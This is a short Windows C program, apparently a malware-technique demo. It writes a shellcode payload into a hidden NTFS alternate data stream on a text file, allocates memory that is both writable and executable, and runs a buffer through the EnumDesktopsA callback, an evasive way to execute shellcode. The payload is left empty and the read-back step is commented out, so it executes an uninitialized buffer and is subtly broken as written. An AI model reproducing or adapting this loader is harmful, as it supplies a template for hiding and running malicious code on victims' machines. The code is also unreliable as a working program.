#include <windows.h>
#include <stdio.h>

int main() {
  char* filename = "C:\\temp\\meow.txt";

  
  char* streamname = "hiddenstream";

  
  char fullpath[1024];
  sprintf(fullpath, "%s:%s", filename, streamname);

 
  unsigned char my_payload[] =
  "";


  HANDLE hFile = CreateFile(fullpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  DWORD bw;
  WriteFile(hFile, my_payload, sizeof(my_payload) - 1, &bw, NULL);
  CloseHandle(hFile);

  /* Just to simply read from the alternate-datastream */
  //hFile = CreateFile(fullpath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

  unsigned char data[sizeof(my_payload) - 1];
  DWORD br;
  
  /* Read as well */
  // ReadFile(hFile, data, sizeof(data), &br, NULL);
  // CloseHandle(hFile);

  LPVOID mem = VirtualAlloc(NULL, sizeof(data), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, data, sizeof(data));
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
  return 0;
}